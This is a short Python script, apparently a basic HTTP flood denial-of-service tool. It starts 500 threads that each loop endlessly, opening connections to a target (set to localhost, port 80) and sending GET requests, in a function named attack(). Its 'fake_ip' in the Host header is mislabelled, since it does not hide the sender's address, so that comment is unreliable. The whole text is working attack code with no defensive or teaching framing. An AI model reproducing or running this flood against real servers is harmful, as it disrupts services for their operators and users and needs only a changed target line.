import socket
import threading

target = '127.0.0.1'  # localhost
port = 80  # HTTP Port
fake_ip = '182.21.20.32'  # Random fake IP

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(500):  # Number of threads
    thread = threading.Thread(target=attack)
    thread.start()
